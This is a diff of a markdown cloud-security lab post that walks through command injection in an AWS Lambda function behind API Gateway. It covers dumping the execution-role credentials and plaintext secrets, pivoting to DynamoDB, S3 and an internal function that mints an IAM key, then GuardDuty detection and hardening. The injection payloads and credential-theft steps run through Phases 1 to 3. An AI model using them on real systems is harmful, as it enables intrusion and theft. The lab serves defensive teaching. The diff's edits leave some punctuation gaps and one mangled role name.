@@ -21,13 +21,13 @@ toc: true
 pin: false
 math: false
 mermaid: false
-image:
+image: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.cloudzero.com%2Fwp-content%2Fuploads%2F2024%2F10%2Flambda-alternatives-1024x536.webp&f=1&nofb=1&ipt=d0d30999a776468c0f16ee550dec7681b20af65d704abeba890736f5e9c57bdd
 ---
 
 ## Objective
 
 Exploit a command injection vulnerability in a Lambda function exposed through API Gateway.
-Steal the function's execution role credentials and its plaintext environment-variable secrets — without ever touching an EC2 instance, a container, or a Kubernetes pod.
+Steal the function's execution role credentials and its plaintext environment-variable secrets  without ever touching an EC2 instance, a container, or a Kubernetes pod.
 Use the over-privileged execution role to pivot into DynamoDB, S3, and a second "internal-only" Lambda function that was never meant to be reachable from the outside.
 Detect the entire chain with GuardDuty Lambda Protection.
 Fix it with least-privilege roles, Secrets Manager, and invocation-source restrictions.
@@ -38,12 +38,12 @@ Fix it with least-privilege roles, Secrets Manager, and invocation-source restri
 
 ## Why Serverless Is Not "No Ops, No Attack Surface"
 
-"Serverless" is sold as inherently more secure — no OS to patch, no server to harden, no long-lived host for an attacker to camp out on.
+"Serverless" is sold as inherently more secure  no OS to patch, no server to harden, no long-lived host for an attacker to camp out on.
 That's true at the infrastructure layer. It says nothing about the application code running inside the function, or the IAM role attached to it.
 
-Every Lambda function runs with an **execution role**. That role's temporary credentials are injected into the execution environment the same way IMDS injects credentials into an EC2 instance — except there's no IMDSv2-style hop-count defense to bypass. If your function code can be tricked into running attacker-controlled commands, the attacker gets the execution role's credentials for free, via environment variables. No SSRF, no metadata hop required.
+Every Lambda function runs with an **execution role**. That role's temporary credentials are injected into the execution environment the same way IMDS injects credentials into an EC2 instance except there's no IMDSv2-style hop-count defense to bypass. If your function code can be tricked into running attacker-controlled commands, the attacker gets the execution role's credentials for free, via environment variables. No SSRF, no metadata hop required.
 
-Combine that with a second extremely common mistake — storing secrets directly in Lambda environment variables instead of Secrets Manager or Parameter Store — and a single injection bug in one function becomes a fast path into every table, bucket, and function that role can touch.
+Combine that with a second extremely common mistake  storing secrets directly in Lambda environment variables instead of Secrets Manager or Parameter Store  and a single injection bug in one function becomes a fast path into every table, bucket, and function that role can touch.
 
 The previous labs in this series required IMDS, IRSA, or a CI/CD pipeline to reach AWS credentials. This one shows the shortest path yet: one HTTP request to a public API Gateway endpoint.
 
@@ -59,7 +59,7 @@ Internet → API Gateway (public REST API: orders-api)
 Lambda execution environment (function: order-processor)
     │
     │  Step 2: Dump environment → execution role creds + plaintext secrets
-    │  Step 3: sts get-caller-identity confirms role: order-processor-role
+    │  Step 3: sts get-caller-identity confirms role: order processorrole
     ▼
 Stolen execution role credentials (used from outside Lambda entirely)
     │
@@ -95,9 +95,9 @@ API Gateway: orders-api (public REST API)
 
 ---
 
-## Phase 0 — Setup
+## Phase 0 Setup
 
-### Step 0.1 — Create the DynamoDB Table and S3 Bucket
+### Step 0.1  Create the DynamoDB Table and S3 Bucket
 
 ```bash
 aws dynamodb create-table \
@@ -117,7 +117,7 @@ aws dynamodb put-item --table-name orders-table --item '{
 aws s3 mb s3://customer-exports-lab-demo
 ```
 
-### Step 0.2 — Write the Vulnerable Lambda Function
+### Step 0.2 Write the Vulnerable Lambda Function
 
 The `/track-order` endpoint "validates" a carrier tracking number by shelling out to `nslookup` against a carrier-lookup hostname built from user input — a real-world anti-pattern for anything that touches a shell.
 
@@ -151,7 +151,7 @@ def handler(event, context):
     }
 ```
 
-### Step 0.3 — Define the Over-Privileged Execution Role
+### Step 0.3 Define the Over-Privileged Execution Role
 
 ```bash
 cat > order-processor-trust.json << 'EOF'
@@ -190,7 +190,7 @@ aws iam attach-role-policy \
   --policy-arn arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
 ```
 
-### Step 0.4 — Deploy the Function With Plaintext Secrets in Env Vars
+### Step 0.4  Deploy the Function With Plaintext Secrets in Env Vars
 
 ```bash
 zip -r order_processor.zip order_processor/
@@ -207,7 +207,7 @@ aws lambda create-function \
   --environment "Variables={DB_PASSWORD=Sup3rSecret!23,STRIPE_API_KEY=sk_live_51H8xREDACTED}"
 ```
 
-### Step 0.5 — Deploy the Internal "admin-tasks" Function
+### Step 0.5  Deploy the Internal "admin-tasks" Function
 
 ```python
 # admin_tasks/app.py
@@ -257,7 +257,7 @@ aws lambda create-function \
 # nothing enforces that.
 ```
 
-### Step 0.6 — Wire Up API Gateway
+### Step 0.6  Wire Up API Gateway
 
 ```bash
 aws apigatewayv2 create-api \
@@ -273,11 +273,11 @@ aws lambda add-permission \
   --principal apigateway.amazonaws.com
 ```
 
-> 📸 **SCREENSHOT:** API Gateway console showing `orders-api` with the `order-processor` integration, and a successful `curl` returning order tracking data
+
 
 ---
 
-## Phase 1 — Discover and Exploit the Injection
+## Phase 1  Discover and Exploit the Injection
 
 First, confirm normal behavior:
 
@@ -297,13 +297,13 @@ curl -X POST "$API_URL/track-order" \
   -d '{"order_id": "ORD-1001", "tracking_number": "1Z999AA1; id"}'
 ```
 
-The `carrier_check` field in the response includes the output of `id`, confirming the tracking number is concatenated straight into a shell command — classic command injection.
+The `carrier_check` field in the response includes the output of `id`, confirming the tracking number is concatenated straight into a shell command classic command injection.
 
-> 📸 **SCREENSHOT:** curl response with `carrier_check` containing `uid=993(sbx_user...) gid=990(sbx_group...)` — proof of code execution inside the Lambda sandbox
+ curl response with `carrier_check` containing `uid=993(sbx_user...) gid=990(sbx_group...)`  proof of code execution inside the Lambda sandbox
 
 ---
 
-## Phase 2 — Harvest Execution Role Credentials and Plaintext Secrets
+## Phase 2  Harvest Execution Role Credentials and Plaintext Secrets
 
 Every Lambda invocation has AWS credentials and any configured environment variables sitting in `os.environ`. Dump them through the same injection point:
 
@@ -329,9 +329,9 @@ DB_PASSWORD=Sup3rSecret!23
 STRIPE_API_KEY=sk_live_51H8xREDACTED
 ```
 
-> 📸 **SCREENSHOT:** injected `env` output showing `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `DB_PASSWORD`, and `STRIPE_API_KEY` in plaintext
+injected `env` output showing `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `DB_PASSWORD`, and `STRIPE_API_KEY` in plaintext
 
-Note the difference from the EC2 and IRSA labs: there was no metadata endpoint to call, no token file to read separately. The Lambda runtime hands the execution role's credentials to the process directly as environment variables — anything that can read `env` inside the function has them.
+Note the difference from the EC2 and IRSA labs: there was no metadata endpoint to call, no token file to read separately. The Lambda runtime hands the execution role's credentials to the process directly as environment variables anything that can read `env` inside the function has them.
 
 Confirm the stolen credentials work from your attacker machine, entirely outside AWS:
 
@@ -351,7 +351,7 @@ aws sts get-caller-identity
 }
 ```
 
-> 📸 **SCREENSHOT:** `aws sts get-caller-identity` run from an attacker laptop, confirming the stolen creds are valid for `order-processor-role`
+ `aws sts get-caller-identity` run from an attacker laptop, confirming the stolen creds are valid for `order-processor-role`
 
 **GuardDuty finding:**
 
@@ -363,7 +363,7 @@ Lambda execution role credentials being used from an IP address outside AWS-mana
 
 ---
 
-## Phase 3 — Enumerate and Pivot With Stolen Credentials
+## Phase 3  Enumerate and Pivot With Stolen Credentials
 
 ```bash
 # Dump every order — customer PII, no query restrictions on the role
@@ -384,7 +384,7 @@ aws lambda list-functions --query 'Functions[].FunctionName'
 ]
 ```
 
-`admin-tasks` was never wired to API Gateway and was intended to run only on a schedule — but `order-processor-role` has an unscoped `lambda:InvokeFunction` on `*`, so it's directly callable:
+`admin-tasks` was never wired to API Gateway and was intended to run only on a schedule but `order-processor-role` has an unscoped `lambda:InvokeFunction` on `*`, so it's directly callable:
 
 ```bash
 aws lambda invoke \
@@ -400,7 +400,7 @@ cat response.json
 {"new_access_key": "AKIAIOSFODNN7EXAMPLE"}
 ```
 
-> 📸 **SCREENSHOT:** `aws lambda invoke` against `admin-tasks` from stolen `order-processor-role` credentials, returning a freshly minted IAM access key for `platform-admin`
+ `aws lambda invoke` against `admin-tasks` from stolen `order-processor-role` credentials, returning a freshly minted IAM access key for `platform-admin`
 
 This is the key lesson of the lab: **Lambda-to-Lambda invocation crosses IAM role boundaries silently.** `order-processor-role` never had `iam:CreateAccessKey` itself — but by invoking `admin-tasks`, it triggered code running under `admin-tasks-role`, which does. The privilege boundary that matters isn't just "what can this role call" — it's "what can this role's calls cause to happen."
 
@@ -414,9 +414,9 @@ GuardDuty Lambda Protection profiles each function's normal invocation sources a
 
 ---
 
-## Phase 4 — Hardening
+## Phase 4  Hardening
 
-### Fix 1 — Least-Privilege Execution Role
+### Fix 1  Least-Privilege Execution Role
 
 ```json
 {
@@ -436,7 +436,7 @@ GuardDuty Lambda Protection profiles each function's normal invocation sources a
 }
 ```
 
-Remove `dynamodb:*`, remove S3 read access the function doesn't need, and — critically — remove the wildcard `lambda:InvokeFunction`. `order-processor` has no legitimate reason to call any other Lambda function.
+Remove `dynamodb:*`, remove S3 read access the function doesn't need, and  critically  remove the wildcard `lambda:InvokeFunction`. `order-processor` has no legitimate reason to call any other Lambda function.
 
 ```bash
 aws iam delete-role-policy --role-name order-processor-role --policy-name order-processor-inline
@@ -446,7 +446,7 @@ aws iam put-role-policy \
   --policy-document file://order-processor-scoped-policy.json
 ```
 
-### Fix 2 — Secrets Belong in Secrets Manager, Not Environment Variables
+### Fix 2  Secrets Belong in Secrets Manager, Not Environment Variables
 
 ```bash
 aws secretsmanager create-secret \
@@ -481,9 +481,9 @@ def get_secret(name):
 db_password = get_secret("order-processor/db-password")
 ```
 
-This doesn't stop the credential theft in Phase 2 — the execution role credentials are still exposed the same way. But it removes `DB_PASSWORD` and `STRIPE_API_KEY` from the blast radius entirely: an attacker with the execution role's credentials still needs `secretsmanager:GetSecretValue` on those specific ARNs, which a properly scoped role won't grant beyond what the function itself needs, and every access is logged individually in CloudTrail.
+This doesn't stop the credential theft in Phase 2  the execution role credentials are still exposed the same way. But it removes `DB_PASSWORD` and `STRIPE_API_KEY` from the blast radius entirely: an attacker with the execution role's credentials still needs `secretsmanager:GetSecretValue` on those specific ARNs, which a properly scoped role won't grant beyond what the function itself needs, and every access is logged individually in CloudTrail.
 
-### Fix 3 — Never Shell Out With Unsanitized Input
+### Fix 3  Never Shell Out With Unsanitized Input
 
 ```python
 import ipaddress
@@ -504,15 +504,15 @@ def handler(event, context):
     ...
 ```
 
-If you must run a subprocess, never use `shell=True` with interpolated input — pass arguments as a list so the shell never re-parses them:
+If you must run a subprocess, never use `shell=True` with interpolated input pass arguments as a list so the shell never re-parses them:
 
 ```python
 subprocess.run(["nslookup", tracking_number], capture_output=True, text=True)
 ```
 
-This alone still isn't a substitute for input validation — it just removes the shell metacharacter injection vector.
+This alone still isn't a substitute for input validation  it just removes the shell metacharacter injection vector.
 
-### Fix 4 — Restrict Who Can Invoke Internal Functions
+### Fix 4 Restrict Who Can Invoke Internal Functions
 
 `admin-tasks` should only ever be invoked by its EventBridge rule. Enforce that with a resource-based policy scoped to the rule's ARN, instead of relying on IAM alone:
 
@@ -527,7 +527,7 @@ aws lambda add-permission \
 
 With this in place, even if `order-processor-role` still had `lambda:InvokeFunction` on `*`, the resource policy on `admin-tasks` itself would reject any caller that isn't the named EventBridge rule.
 
-### Fix 5 — Enable GuardDuty Lambda Protection
+### Fix 5  Enable GuardDuty Lambda Protection
 
 ```bash
 aws guardduty update-detector \
@@ -547,11 +547,11 @@ With Lambda Protection enabled, GuardDuty monitors each function's network activ
 | Invocation pattern deviates from baseline | `Discovery:Lambda/AnomalousBehavior` |
 | Traffic to a known-malicious IP | `Impact:Lambda/MaliciousIPAddress.Reputation` |
 
-> 📸 **SCREENSHOT:** GuardDuty → detector settings showing Lambda Protection enabled, with findings appearing for `order-processor`
+ GuardDuty → detector settings showing Lambda Protection enabled, with findings appearing for `order-processor`
 
-### Fix 6 — Reduce Blast Radius With VPC Egress Control and Reserved Concurrency
+### Fix 6  Reduce Blast Radius With VPC Egress Control and Reserved Concurrency
 
-If a function doesn't need broad internet access, attach it to a VPC with no NAT gateway or a tightly scoped security group — this blocks arbitrary outbound C2/exfil traffic even if the code is compromised. Set reserved concurrency on sensitive functions so a compromised function can't be abused to exhaust account-wide Lambda concurrency as a denial-of-service side effect.
+If a function doesn't need broad internet access, attach it to a VPC with no NAT gateway or a tightly scoped security group  this blocks arbitrary outbound C2/exfil traffic even if the code is compromised. Set reserved concurrency on sensitive functions so a compromised function can't be abused to exhaust account-wide Lambda concurrency as a denial-of-service side effect.
 
 ```bash
 aws lambda put-function-concurrency \
@@ -563,11 +563,11 @@ aws lambda put-function-concurrency \
 
 ## Key Takeaways
 
-- Lambda execution role credentials are handed to the running process as plain environment variables — there is no IMDSv2-style hop-count defense to bypass, any code execution inside the function is credential theft
+- Lambda execution role credentials are handed to the running process as plain environment variables  there is no IMDSv2-style hop-count defense to bypass, any code execution inside the function is credential theft
 - Environment variables are not a secrets store: anyone who can read `env` inside the function, or call `lambda:GetFunctionConfiguration` from outside, sees them in plaintext
-- `lambda:InvokeFunction` on `*` lets one function's stolen credentials silently trigger a completely different function's execution role — the real privilege boundary is what your calls can *cause*, not just what your role can directly do
+- `lambda:InvokeFunction` on `*` lets one function's stolen credentials silently trigger a completely different function's execution role  the real privilege boundary is what your calls can *cause*, not just what your role can directly do
 - A resource-based policy on the callee is the only reliable way to restrict *who* can invoke an internal-only function; IAM allow rules on the caller side are not enough on their own
-- GuardDuty doesn't see the application-layer injection bug at all — it sees the resulting credential misuse and network anomalies. Fixing the injection is still the only way to prevent the theft in the first place
+- GuardDuty doesn't see the application-layer injection bug at all it sees the resulting credential misuse and network anomalies. Fixing the injection is still the only way to prevent the theft in the first place
 
 ---
 
